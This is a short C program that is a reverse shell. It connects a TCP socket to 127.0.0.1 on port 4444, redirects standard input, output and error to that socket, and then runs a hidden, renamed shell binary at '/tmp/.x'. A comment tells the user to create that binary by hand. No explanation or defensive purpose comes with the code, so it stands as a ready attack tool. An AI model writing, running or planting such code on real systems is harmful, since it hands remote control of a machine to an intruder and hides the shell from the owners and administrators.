#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

int main() {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

    connect(sock, (struct sockaddr*)&server, sizeof(server));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // renamed shell binary (you must create this manually) 
    char *args[] = {"/tmp/.x", NULL};
    execve("/tmp/.x", args, NULL);

    return 0;
}